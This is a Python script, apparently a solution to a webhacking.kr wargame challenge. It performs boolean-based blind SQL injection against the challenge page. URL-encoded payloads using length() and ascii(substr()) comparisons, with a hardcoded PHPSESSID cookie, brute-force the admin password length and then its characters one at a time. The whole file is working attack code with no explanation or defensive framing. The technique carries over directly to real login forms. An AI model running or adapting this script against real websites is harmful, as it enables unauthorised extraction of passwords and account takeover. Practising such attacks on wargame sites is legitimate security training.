from requests import *
cookies={'PHPSESSID':'leip2cs05g0smibali2p7hr9ho'}
key='wrong password'
leng=0
count=0
for i in range(40):
    url=f'https://webhacking.kr/challenge/bonus-1/index.php?id=admin&pw=admin%20/%201%27or%28length%28pw%29%3D{i}%29%23'
    response=get(url=url,cookies=cookies)
    response_text=response.text
    if response_text.find(key) != -1:
        print('admin pw length is ',i)
        leng=i
print('admin pw is ',end='')
for i in range(1,leng+1):
    if count>113:
        print('query error')
        break
    for j in range(20,133):
        url=f'https://webhacking.kr/challenge/bonus-1/index.php?id=admin&pw=1%27or%28id%3D%27admin%27%29and%28ascii%28substr%28pw%2C{i}%2C1%29%29%29%3D{j}%23'
        response=get(url=url,cookies=cookies)
        response_text=response.text
        count+=1
        if response_text.find(key) != -1:
            print(chr(j),end='')
            count=0
            break
print('\n')